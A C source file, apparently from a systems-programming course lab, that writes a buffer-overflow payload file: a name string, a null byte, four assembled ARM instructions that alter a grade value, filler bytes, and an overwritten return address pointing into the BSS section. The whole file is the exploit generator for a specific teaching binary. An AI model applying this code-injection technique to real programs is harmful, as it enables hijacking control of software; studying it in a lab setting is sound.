/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Ishaan Javali and Jack Zhang                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


/* 
main does not receive any parameters or input from stdin or 
other streams. It does not write to stdout. It uses fprintf 
to write 56 bytes to a file called dataA and returns 0.
 */
int main() {
    FILE *psFile;
    unsigned int movInstr;
    unsigned int adrInstr;
    unsigned int strbInstr;
    unsigned int bInstr;
    psFile = fopen("dataA", "w");
    
    /* 15 bytes (authors' names) */
    fprintf(psFile, "Ishaan and Jack");
    /* Writes 00000000 = 1 byte. null byte*/
    fprintf(psFile, "%c", '\0'); 

    movInstr = MiniAssembler_mov(0, 'A');
    adrInstr = MiniAssembler_adr(1, 0x420044, 0x42006C);
    strbInstr = MiniAssembler_strb(0, 1);
    bInstr = MiniAssembler_b(0x400864, 0x420074);

    /* Write machine code instructions for 'A' attack.
     4 bytes per instruction. Total 16 bytes. */
    fwrite(&movInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&adrInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&strbInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&bInstr, sizeof(unsigned int), 1, psFile);

    /* 16 filler bytes */
    fprintf(psFile, "1234567812345678");


    /* Replace getName's return address
     with 0x420068 (address in BSS section where 
     machine code instructions begin*/
    fprintf(psFile, "%c", 0x68);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x42);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);

    /* Close the file */
    fclose(psFile);
    return 0;
}